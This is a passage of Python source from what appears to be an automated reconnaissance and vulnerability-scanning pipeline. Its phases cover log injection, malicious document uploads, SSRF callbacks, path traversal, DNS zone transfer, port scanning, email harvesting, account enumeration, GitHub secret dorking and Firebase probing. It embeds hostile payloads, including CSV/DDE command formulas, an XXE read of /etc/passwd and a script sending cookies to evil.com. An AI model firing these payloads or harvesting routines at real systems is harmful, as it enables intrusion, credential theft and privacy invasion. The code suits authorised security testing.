        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() not in log_params:
                continue
            for payload in _LOG_INJECT_PAYLOADS:
                try:
                    test_qs = qs.copy()
                    test_qs[param_name] = [payload]
                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    await _throttle_rate()
                    req = urllib.request.Request(test_url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_l_extra_headers})
                    s, _, _ = await _async_urlopen(_l_urlopen, req, timeout=10)
                    if s in (200, 201, 302):
                        findings.append(
                            f"[log-inject-param] {test_url} — param={param_name} — HTTP {s}"
                        )
                        break
                except Exception:
                    continue
    for host in read_lines(outdir / "hosts.txt") if (outdir / "hosts.txt").exists() else []:
        host_clean = host.split(":")[0].strip() if ":" in host else host.strip()
        if not host_clean:
            continue
        for header_name in log_headers:
            for payload in _LOG_INJECT_PAYLOADS[:3]:
                try:
                    req = urllib.request.Request(f"https://{host_clean}/", method="GET",
                        headers={
                            "User-Agent": "Mozilla/5.0",
                            header_name: payload,
                            **_l_extra_headers,
                        })
                    s, _, _ = await _async_urlopen(_l_urlopen, req, timeout=8)
                    if s in (200, 201):
                        findings.append(f"[log-inject-header] https://{host_clean}/ — header={header_name} — HTTP {s}")
                        break
                except Exception:
                    continue
    if not findings:
        findings.append("[log-inject] No log injection vectors detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"62-LOG-INJECT: {len(findings)} log injection findings → {out}")
    return {"62-LOG-INJECT": str(out), "count": len(findings)}

_DOC_ATTACK_ENDPOINTS = [
    "/upload", "/api/upload", "/file/upload", "/document/upload",
    "/import", "/api/import", "/csv/import", "/bulk/import",
    "/api/files", "/api/documents",
    "/api/v1/upload", "/api/v2/upload",
]
_DOC_ATTACK_PAYLOADS = [
    ("csv", "=CMD|'/C ping 127.0.0.1'!A0"),
    ("csv", "=HYPERLINK(\"http://evil.com/exfil\",\"Click\")"),
    ("csv", '=DDE("cmd";"/c calc";"AAA")'),
    ("csv", "=WEBSERVICE(\"http://evil.com/\")"),
    ("xlsx", "=EXEC(\"calc\")"),
    ("docx", "${7*7}"),
    ("pdf", "<script>app.alert(1)</script>"),
    ("xml", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
    ("svg", '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
    ("html", "<html><body><script>fetch('http://evil.com/steal?cookie='+document.cookie)</script></body></html>"),
]

async def phase_63_DOC_ATTACK(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"63-DOC-ATTACK"}:
        return {}
    _out = outdir / "document_attacks.txt"
    if _out.exists() and not force:
        return {"63-DOC-ATTACK": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 63-DOC-ATTACK: document-based attack vector detection")
    findings: List[str] = []
    _d_urlopen = _get_urlopener()
    _d_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "63-DOC-ATTACK: no hosts; skipping")
        return {"63-DOC-ATTACK": str(_out), "count": 0}
    for host in hosts[:10]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for scheme in ("https://", "http://"):
            base = f"{scheme}{host_clean}"
            for endpoint in _DOC_ATTACK_ENDPOINTS:
                url = f"{base}{endpoint}"
                try:
                    req = urllib.request.Request(url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_d_extra_headers})
                    s, _, _ = await _async_urlopen(_d_urlopen, req, timeout=8)
                    if s not in (200, 201, 202, 204, 401, 403, 405):
                        continue
                    findings.append(f"[doc-attack-endpoint] {url} — HTTP {s}")
                    for fmt, payload in _DOC_ATTACK_PAYLOADS:
                        try:
                            content_map = {
                                "csv": "text/csv",
                                "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                                "docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                "pdf": "application/pdf",
                                "xml": "application/xml",
                                "svg": "image/svg+xml",
                                "html": "text/html",
                            }
                            ctype = content_map.get(fmt, "application/octet-stream")
                            post_req = urllib.request.Request(url,
                                data=payload.encode("utf-8"),
                                method="POST",
                                headers={
                                    "User-Agent": "Mozilla/5.0",
                                    "Content-Type": ctype,
                                    "Content-Disposition": f'attachment; filename="exploit.{fmt}"',
                                    **_d_extra_headers,
                                })
                            ps, pheaders, pbody = await _async_urlopen(_d_urlopen, post_req, timeout=10)
                            pbody_str = pbody.decode("utf-8", errors="ignore")
                            if ps in (200, 201, 202, 204):
                                findings.append(
                                    f"[doc-attack-upload] {url} — format={fmt} — HTTP {ps} "
                                    f"(document upload accepted)"
                                )
                            if "error" in pbody_str.lower() and any(
                                kw in pbody_str.lower() for kw in ["parse", "invalid", "malformed", "unexpected"]
                            ):
                                findings.append(
                                    f"[doc-attack-parser-error] {url} — format={fmt} — parser error in response"
                                )
                        except urllib.error.HTTPError as e:
                            if e.code in (200, 201, 202, 204):
                                findings.append(
                                    f"[doc-attack-upload] {url} — format={fmt} — HTTP {e.code} "
                                    f"(document upload accepted)"
                                )
                        except Exception:
                            continue
                except Exception:
                    continue
            break
    if not findings:
        findings.append("[doc-attack] No document-based attack vectors detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"63-DOC-ATTACK: {len(findings)} document attack findings → {out}")
    return {"63-DOC-ATTACK": str(out), "count": len(findings)}

_IDEMPOTENCY_HEADERS = ["Idempotency-Key", "X-Idempotency-Key", "X-Request-Id", "Idempotency-Key", "X-Idempotency-Request", "Request-Id"]


async def phase_64_IDEMPOTENCY(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"64-IDEMPOTENCY"}:
        return {}
    _out = outdir / "idempotency.txt"
    if _out.exists() and not force:
        return {"64-IDEMPOTENCY": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 64-IDEMPOTENCY: idempotency key replay testing")
    findings: List[str] = []
    _id_urlopen = _get_urlopener()
    _id_extra_headers = _extra_headers_dict()

    # Collect POST endpoints from harvested URLs
    api_endpoints: Set[str] = set()
    urls_file = outdir / "urls_all.txt"
    if urls_file.exists():
        for u in read_lines(urls_file):
            parsed = urllib.parse.urlparse(u)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if any(m in base.lower() for m in ("/api/", "/v1/", "/v2/", "/graphql", "/rest/", "/payment", "/transfer", "/order", "/checkout")):
                api_endpoints.add(base)

    if not api_endpoints:
        fuzz_file = outdir / "fuzz.txt"
        if fuzz_file.exists():
            for ln in read_lines(fuzz_file):
                parts = ln.split("\t") if "\t" in ln else ln.split()
                for p in parts:
                    if p.startswith("http") and any(m in p.lower() for m in ("/api/", "/v1/", "/v2/")):
                        api_endpoints.add(p.split("?")[0])

    targets = list(api_endpoints)[:10]
    if not targets:
        findings.append("[idempotency] No API endpoints found for replay testing")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        log("ok", f"64-IDEMPOTENCY: {len(findings)} findings → {out}")
        return {"64-IDEMPOTENCY": str(out), "count": len(findings)}

    for endpoint in targets:
        for header_name in _IDEMPOTENCY_HEADERS:
            key = f"reconchain-replay-{hashlib.md5(endpoint.encode()).hexdigest()[:8]}"
            test_body = json.dumps({"test": True, "ts": str(datetime.now())}).encode()
            try:
                req1 = urllib.request.Request(endpoint, data=test_body, method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0",
                             header_name: key, **_id_extra_headers})
                s1, h1, b1 = await _async_urlopen(_id_urlopen, req1, timeout=10)
                b1_text = b1.decode("utf-8", errors="ignore")
            except urllib.error.HTTPError as e:
                s1, b1_text = e.code, e.read().decode("utf-8", errors="ignore")
            except Exception:
                continue

            modified_body = json.dumps({"test": True, "ts": str(datetime.now()), "modified": True}).encode()
            try:
                req2 = urllib.request.Request(endpoint, data=modified_body, method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0",
                             header_name: key, **_id_extra_headers})
                s2, h2, b2 = await _async_urlopen(_id_urlopen, req2, timeout=10)
                b2_text = b2.decode("utf-8", errors="ignore")
            except urllib.error.HTTPError as e:
                s2, b2_text = e.code, e.read().decode("utf-8", errors="ignore")
            except Exception:
                continue

            if s1 in (200, 201, 202) and s2 in (200, 201, 202):
                if b1_text != b2_text or s1 != s2:
                    findings.append(
                        f"[idempotency-violation] {endpoint} — header={header_name} key={key} "
                        f"— replay with different body returned different response "
                        f"(req1: HTTP {s1}, req2: HTTP {s2})"
                    )
                else:
                    findings.append(
                        f"[idempotency-compliant] {endpoint} — header={header_name} — "
                        f"replay returned identical response (HTTP {s1})"
                    )
            elif s1 != s2:
                findings.append(
                    f"[idempotency-different-status] {endpoint} — header={header_name} — "
                    f"first=HTTP {s1}, second=HTTP {s2} (possible non-idempotent)"
                )

    if not findings:
        findings.append("[idempotency] No idempotency-key endpoints detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"64-IDEMPOTENCY: {len(findings)} findings → {out}")
    return {"64-IDEMPOTENCY": str(out), "count": len(findings)}

async def phase_66_SSRF_FULL(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any],
    oast_domain: str = "", force: bool = False,
) -> Dict[str, Any]:
    if skip & {"66-SSRF-FULL"}:
        return {}
    _out = outdir / "ssrf_full.txt"
    if _out.exists() and not force:
        return {"66-SSRF-FULL": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 66-SSRF-FULL: SSRF with OOB callback testing")
    findings: List[str] = []
    _sf_urlopen = _get_urlopener()
    _sf_extra = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        findings.append("[ssrf-full] No URLs available for testing")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"66-SSRF-FULL": str(_out), "count": len(findings)}

    callback = oast_domain or ""
    if not callback:
        findings.append("[ssrf-full] No OAST callback domain available (use --oast-domain)")
    else:
        urls = read_lines(urls_file)[:_PIPELINE_CFG.sample_urls_fuzz]
        ssrf_params = ["url", "uri", "file", "path", "dest", "redirect", "return",
                       "next", "img", "image", "load", "read", "document", "page",
                       "folder", "root", "host", "domain", "show", "view", "dir",
                       "location", "target", "to", "out", "data", "reference", "site"]
        for url in urls:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param in qs:
                if param.lower() in ssrf_params:
                    new_qs = []
                    for k, vals in qs.items():
                        for v in vals:
                            if k == param:
                                new_qs.append((k, f"http://{callback}/ssrf/{param}"))
                            else:
                                new_qs.append((k, v))
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, urllib.parse.urlencode(new_qs), parsed.fragment,
                    ))
                    try:
                        req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_sf_extra})
                        status, _, _ = await _async_urlopen(_sf_urlopen, req, timeout=10)
                        if status in (200, 301, 302):
                            findings.append(f"[ssrf-oob-tested] {test_url} → HTTP {status} (check OAST for callback)")
                    except Exception as e:
                        if "timeout" not in str(e).lower():
                            findings.append(f"[ssrf-oob-error] {test_url} → {e}")

    if not findings:
        findings.append("[ssrf-full] No SSRF parameters found or tested")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"66-SSRF-FULL: {len(findings)} findings → {out}")
    return {"66-SSRF-FULL": str(_out), "count": len(findings)}


# ────────────────── Phase 67-PATHNORM: path normalization ──────────────────
_PATH_TRAVERSAL_PAYLOADS = [
    "/..;/", "/../", "/%2e%2e/", "/%2e%2e%2f", "/..%252f", "/..%c0%ae/",
    "/.%00/", "/....//....//", "/..\\", "//", "/%5c..%5c", "/..%5c",
    "/..%252f..%252f", "/%c0%ae%c0%ae/", "/%252e%252e%252f",
]

async def phase_67_PATHNORM(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"67-PATHNORM"}:
        return {}
    _out = outdir / "path_normalization.txt"
    if _out.exists() and not force:
        return {"67-PATHNORM": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 67-PATHNORM: path normalization / traversal")
    findings: List[str] = []
    _pn_urlopen = _get_urlopener()
    _pn_extra = _extra_headers_dict()
    targets = [h for h in (read_lines(outdir / "host_targets.txt") if (outdir / "host_targets.txt").exists() else read_lines(outdir / "hosts.txt") if (outdir / "hosts.txt").exists() else [])][:_PIPELINE_CFG.sample_hosts_ssl]

    if not targets:
        findings.append("[pathnorm] No targets available")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"67-PATHNORM": str(_out), "count": len(findings)}

    for host in targets:
        base = host.rstrip("/")
        for payload in _PATH_TRAVERSAL_PAYLOADS:
            await _throttle_rate()
            path = payload.lstrip("/")
            test_url = f"{base}/{path}etc/passwd"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_pn_extra})
                status, headers, body = await _async_urlopen(_pn_urlopen, req, timeout=8)
                body_text = body.decode("utf-8", errors="ignore").lower()
                if status == 200 and ("root:" in body_text or "daemon:" in body_text or "bin:" in body_text or "nobody:" in body_text):
                    findings.append(f"[pathnorm-lfi] {test_url} → HTTP 200 (LFI via {payload})")
                elif status == 200 and body_text.strip():
                    findings.append(f"[pathnorm-diff] {test_url} → HTTP 200 ({len(body_text)}b, check manually)")
                elif status not in (404, 400):
                    findings.append(f"[pathnorm-status] {test_url} → HTTP {status}")
            except Exception:
                pass

    if not findings:
        findings.append("[pathnorm] No path normalization issues detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"67-PATHNORM: {len(findings)} findings → {out}")
    return {"67-PATHNORM": str(_out), "count": len(findings)}

async def phase_69_DNSZT(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"69-DNSZT"}:
        return {}
    _out = outdir / "dns_zone_transfer.txt"
    if _out.exists() and not force:
        return {"69-DNSZT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 69-DNSZT: DNS zone transfer")
    findings: List[str] = []

    async def _get_nameservers() -> List[str]:
        ns: List[str] = []
        if t.has("dig"):
            try:
                rc, stdout, _ = await _run_cmd_clear_proxy(["dig", "+short", "NS", domain])
                if rc == 0:
                    ns = [ln.decode().strip().rstrip(".") for ln in stdout.splitlines() if ln.strip()]
            except Exception:
                pass
        if not ns:
            try:
                rc, stdout, _ = await _run_cmd_clear_proxy(["nslookup", "-type=NS", domain])
                if rc == 0:
                    for ln in stdout.decode(errors="ignore").splitlines():
                        m = re.search(r'nameserver\s*=\s*(\S+)', ln, re.IGNORECASE)
                        if m:
                            ns.append(m.group(1).rstrip("."))
            except Exception:
                pass
        return ns

    nameservers = await _get_nameservers()
    if not nameservers:
        findings.append("[dns-zt] No nameservers found for domain")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"69-DNSZT": str(_out), "count": len(findings)}

    for ns in nameservers:
        if t.has("dig"):
            try:
                rc, stdout, stderr = await _run_cmd_clear_proxy(["dig", "@" + ns, domain, "AXFR"], timeout=15)
                output = stdout.decode(errors="ignore")
                err_text = stderr.decode(errors="ignore")
                if "Transfer failed" in err_text or "refused" in err_text.lower() or "timed out" in err_text.lower():
                    findings.append(f"[dns-zt-secure] {ns} — zone transfer refused (secure)")
                elif any(ln.strip() and "IN" in ln for ln in output.splitlines() if "SOA" in ln or "NS" in ln or "A" in ln):
                    n_records = len([ln for ln in output.splitlines() if ln.strip()])
                    findings.append(f"[dns-zt-vulnerable] {ns} — zone transfer SUCCEEDED ({n_records} records)")
                    for ln in output.splitlines()[:20]:
                        findings.append(f"  {ln.strip()}")
                    if n_records > 20:
                        findings.append(f"  … and {n_records - 20} more records")
                else:
                    findings.append(f"[dns-zt-checked] {ns} — no zone data returned")
            except asyncio.TimeoutError:
                findings.append(f"[dns-zt-timeout] {ns} — zone transfer timed out")
            except Exception as e:
                findings.append(f"[dns-zt-error] {ns} — {e}")

    if not findings:
        findings.append("[dns-zt] No zone transfer tests completed")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"69-DNSZT: {len(findings)} findings → {out}")
    return {"69-DNSZT": str(_out), "count": len(findings)}


# ────────────────── Phase 70-PORTFULL: full port scan on top target ──────
async def phase_70_PORTFULL(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"70-PORTFULL"}:
        return {}
    _out = outdir / "ports_full.txt"
    if _out.exists() and not force:
        return {"70-PORTFULL": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 70-PORTFULL: full port scan (-p-) on top target")
    findings: List[str] = []
    hosts_file = outdir / "hosts.txt"
    if not hosts_file.exists() or not read_lines(hosts_file):
        findings.append("[portfull] No hosts available")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"70-PORTFULL": str(_out), "count": len(findings)}

    top_hosts = [h.split("://")[-1].split("/")[0].split(":")[0] for h in read_lines(hosts_file)][:3]
    for host in top_hosts:
        port_out: Optional[Path] = None
        try:
            if t.has("nmap"):
                port_out = outdir / f"ports_full_{_safe_name(host)}.txt"
                _full_timing = ["-T3", "--min-rate", "200"] if _PIPELINE_CFG.safe_mode else ["-T4", "--min-rate", "500"]
                _full_timeout = 1800 if _PIPELINE_CFG.safe_mode else 3600
                await _run(
                    f"nmap-full-{_safe_name(host)[:16]}",
                    ["nmap", "-Pn", "-p-", "--open"] + _full_timing + ["-oG", str(port_out), host],
                    _full_timeout, outdir,
                    3600, outdir,
                )
                if port_out.exists():
                    port_lines = read_lines(port_out)
                    open_ports = [ln for ln in port_lines if "/open/" in ln]
                    if open_ports:
                        for ln in open_ports:
                            findings.append(f"[portfull-found] {host} → {ln.strip()}")
                    else:
                        findings.append(f"[portfull-clean] {host} — no open ports beyond top-1000")
            elif t.has("naabu"):
                port_out = outdir / f"ports_full_{_safe_name(host)}.txt"
                await _run(
                    f"naabu-full-{_safe_name(host)[:16]}",
                    ["naabu", "-silent", "-host", host, "-p", "-", "-o", str(port_out)],
                    3600, outdir,
                )
                if port_out.exists() and read_lines(port_out):
                    for ln in read_lines(port_out):
                        findings.append(f"[portfull-found] {ln.strip()}")
                else:
                    findings.append(f"[portfull-clean] {host} — no additional ports found")
        finally:
            if port_out and port_out.exists():
                port_out.unlink(missing_ok=True)

    if not findings:
        findings.append("[portfull] No full port scan performed (nmap/naabu required)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"70-PORTFULL: {len(findings)} findings → {out}")
    return {"70-PORTFULL": str(_out), "count": len(findings)}

_EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")

async def phase_71_EMHARVEST(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"71-EMHARVEST"}:
        return {}
    _out = outdir / "emails_harvested.txt"
    if _out.exists() and not force:
        return {"71-EMHARVEST": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 71-EMHARVEST: email harvesting from URLs content")
    findings: List[str] = []
    _eh_urlopen = _get_urlopener()
    _eh_extra = _extra_headers_dict()
    seen_emails: Set[str] = set()

    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists():
        findings.append("[emails] No URLs to scan")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"71-EMHARVEST": str(_out), "count": len(findings)}

    urls = read_lines(urls_file)[:100]
    for url in urls:
        await _throttle_rate()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_eh_extra})
            _, _, body_bytes = await _async_urlopen(_eh_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
        except Exception:
            continue
        for m in _EMAIL_RE.finditer(body):
            email = m.group().lower()
            if email not in seen_emails:
                seen_emails.add(email)
                findings.append(f"[email] {email} ({url})")

    if not findings:
        findings.append("[emails] No email addresses found in scanned content")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"71-EMHARVEST: {len(findings)} findings → {out}")
    return {"71-EMHARVEST": str(_out), "count": len(findings)}


# ───────────────────── Phase 72-ACCOUNTENUM: account enumeration ─────────────────────
async def phase_72_ACCOUNTENUM(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"72-ACCOUNTENUM"}:
        return {}
    _out = outdir / "account_enum.txt"
    if _out.exists() and not force:
        return {"72-ACCOUNTENUM": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 72-ACCOUNTENUM: account enumeration detection")
    findings: List[str] = []
    _ae_urlopen = _get_urlopener()
    _ae_headers = _extra_headers_dict()
    targets_file = outdir / "host_targets.txt"
    if not targets_file.exists() or not read_lines(targets_file):
        log("warn", "72-ACCOUNTENUM: no host targets; skipping")
        return {"72-ACCOUNTENUM": str(_out), "count": 0}
    enum_paths = [
        ("/login", "POST", {"username": "nonexistent_user_12345", "password": "wrongpass"}),
        ("/login", "POST", {"email": "nonexistent_user_12345@test.com", "password": "wrongpass"}),
        ("/api/login", "POST", {"username": "nonexistent_user_12345", "password": "wrongpass"}),
        ("/signup", "POST", {"email": "existing_test@example.com"}),
        ("/register", "POST", {"email": "existing_test@example.com"}),
        ("/forgot-password", "POST", {"email": "nonexistent_user_12345@test.com"}),
        ("/forgot-password", "POST", {"username": "nonexistent_user_12345"}),
        ("/api/forgot-password", "POST", {"email": "nonexistent_user_12345@test.com"}),
        ("/reset-password", "POST", {"token": "invalid_token_12345"}),
        ("/api/reset-password", "POST", {"token": "invalid_token_12345"}),
    ]
    _ae_sem = asyncio.Semaphore(10)
    for host in read_lines(targets_file)[:10]:
        base = host if host.startswith("http") else f"https://{host}"
        for path, method, body in enum_paths:
            async with _ae_sem:
                await _throttle_rate()
                try:
                    url = f"{base.rstrip('/')}{path}"
                    data = urllib.parse.urlencode(body).encode() if body else b""
                    req = urllib.request.Request(url, data=data or None, method=method,
                        headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded", **_ae_headers})
                    status, headers, body_bytes = await _async_urlopen(_ae_urlopen, req, timeout=10)
                    resp_body = body_bytes.decode("utf-8", errors="ignore").lower()
                    resp_len = len(resp_body)
                    resp_time = headers.get("X-Response-Time", "")
                    findings.append(f"[probed] {method} {url} → HTTP {status} len={resp_len} time={resp_time}")
                except urllib.error.HTTPError as e:
                    findings.append(f"[probed] {method} {url} → HTTP {e.code} (expected)")
                except Exception as e:
                    findings.append(f"[error] {method} {url} → {e}")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"72-ACCOUNTENUM: {len(findings)} probes → {out}")
    return {"72-ACCOUNTENUM": str(_out), "count": len(findings)}

async def phase_74_GHTOOLS(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"74-GHTOOLS"}:
        return {}
    _out = outdir / "github_dorking.txt"
    if _out.exists() and not force:
        return {"74-GHTOOLS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 74-GHTOOLS: GitHub dorking + supply chain scanning")
    findings: List[str] = []
    org = domain.split(".")[0] if "." in domain else domain
    gh_dorks = [
        f"org:{org} password",
        f"org:{org} secret",
        f"org:{org} api_key",
        f"org:{org} token",
        f"org:{org} aws_key",
        f"org:{org} .env",
        f"org:{org}-----BEGIN",
        f"\"{domain}\" password",
        f"\"{domain}\" secret",
        f"\"{domain}\" NPM_TOKEN",
        f"\"{domain}\" AWS_ACCESS_KEY",
        f"\"{domain}\" slack_token",
        f"{domain} filename:.env",
        f"{domain} filename:.npmrc",
        f"{domain} filename:.dockercfg",
    ]
    _gh_urlopen = _get_urlopener()
    _gh_token = os.environ.get("GITHUB_TOKEN", "")
    _gh_headers = {"User-Agent": "Mozilla/5.0", **_extra_headers_dict()}
    if _gh_token:
        _gh_headers["Authorization"] = f"Bearer {_gh_token}"
    for dork in gh_dorks[:10]:
        await _throttle_rate()
        try:
            query = urllib.parse.quote(dork)
            url = f"https://api.github.com/search/code?q={query}&per_page=5"
            req = urllib.request.Request(url, headers=_gh_headers)
            _, _, body_bytes = await _async_urlopen(_gh_urlopen, req, timeout=15)
            data = json.loads(body_bytes.decode("utf-8", errors="ignore"))
            total = data.get("total_count", 0)
            findings.append(f"[dork] {dork} → {total} results")
            for item in data.get("items", [])[:3]:
                repo = item.get("repository", {}).get("full_name", "?")
                path = item.get("path", "?")
                html_url = item.get("html_url", "")
                findings.append(f"  {repo}/{path} {html_url}")
        except urllib.error.HTTPError as e:
            if e.code == 403:
                findings.append(f"[dork] {dork} → rate limited (403)")
                if not _gh_token:
                    findings.append("  set GITHUB_TOKEN env var for higher rate limits")
                break
            elif e.code == 422:
                findings.append(f"[dork] {dork} → invalid query")
            else:
                findings.append(f"[dork] {dork} → HTTP {e.code}")
        except Exception as e:
            findings.append(f"[dork] {dork} → {e}")
    findings.append("")
    findings.append("--- Dependency Checks ---")
    tech_file = outdir / "tech.txt"
    if tech_file.exists():
        for ln in read_lines(tech_file):
            if "/" in ln:
                pkg = ln.split()[-1] if ln.split() else ""
                findings.append(f"[tech] {pkg}")
    findings.append("[note] Run 'npm audit' on any found package.json or yarn.lock")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"74-GHTOOLS: {len(findings)} dorking findings → {out}")
    return {"74-GHTOOLS": str(_out), "count": len(findings)}


# ───────────────────── Phase 75-MOBILEAPI: Firebase/mobile API scanning ─────────────────────
async def phase_75_MOBILEAPI(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"75-MOBILEAPI"}:
        return {}
    _out = outdir / "mobile_api.txt"
    if _out.exists() and not force:
        return {"75-MOBILEAPI": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 75-MOBILEAPI: Firebase/mobile API surface scanning")
    findings: List[str] = []
    _mb_urlopen = _get_urlopener()
    _mb_headers = _extra_headers_dict()
    base_domain = domain.split(":")[0].lower().strip()
    org_part = base_domain.split(".")[0] if "." in base_domain else base_domain
    # Firebase DB scanning
    firebase_tests = [
        f"https://{org_part}.firebaseio.com/.json",
        f"https://{base_domain.replace('.', '-')}.firebaseio.com/.json",
        f"https://{org_part}.firebaseio.com/.settings/rules.json",
        f"https://{base_domain}.firebaseio.com/.json",
    ]
    for fb_url in firebase_tests:
        await _throttle_rate()
        try:
            req = urllib.request.Request(fb_url, method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_mb_headers})
            _, _, body_bytes = await _async_urlopen(_mb_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
            if body.strip() and body.strip() not in ("null", "{}", "[]"):
                findings.append(f"[firebase-open] {fb_url} → data accessible!")
                findings.append(f"  data_preview={body[:200]}")
            else:
                findings.append(f"[firebase-noop] {fb_url} → not open (no data)")
        except urllib.error.HTTPError as e:
            if e.code == 401:
                findings.append(f"[firebase-secured] {fb_url} → HTTP 401 (auth required)")
            else:
                findings.append(f"[firebase-checked] {fb_url} → HTTP {e.code}")
        except Exception as e:
            findings.append(f"[firebase-error] {fb_url} → {e}")
    # Firebase API key scanning in URLs
    urls_file = outdir / "urls_all.txt"
    if urls_file.exists():
        for ln in read_lines(urls_file):
            if "firebaseio.com" in ln or "firebase" in ln.lower():
                findings.append(f"[firebase-ref] {ln}")
            for pat in ("AIza", "key=", "apiKey=", "authDomain="):
                if pat in ln and "firebase" in ln.lower():
                    findings.append(f"[firebase-key] {ln[:150]}")
    # Check for common mobile API patterns in harvested URLs
    mobile_patterns = ["/api/v", "/mobile/", "/app/", "/android/", "/ios/",
                       ".plist", ".apk", ".ipa", ".mobileconfig"]
    _skip_domains = ("jimcdn.com", "jimdo.com", "cdn.", "assets.", "static.", "img.", "images.")
    if urls_file and read_lines(urls_file):
        for url in read_lines(urls_file):
            url_lower = url.lower()
            if any(sd in url_lower for sd in _skip_domains):
                continue
            for pat in mobile_patterns:
                if pat in url_lower:
                    findings.append(f"[mobile-endpoint] {url}")
                    break
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"75-MOBILEAPI: {len(findings)} mobile findings → {out}")
    return {"75-MOBILEAPI": str(_out), "count": len(findings)}

async def phase_76_WORKFLOW(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"76-WORKFLOW"}:
        return {}
    _out = outdir / "workflow_bypass.txt"
    if _out.exists() and not force:
        return {"76-WORKFLOW": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 76-WORKFLOW: multi-step workflow bypass detection")
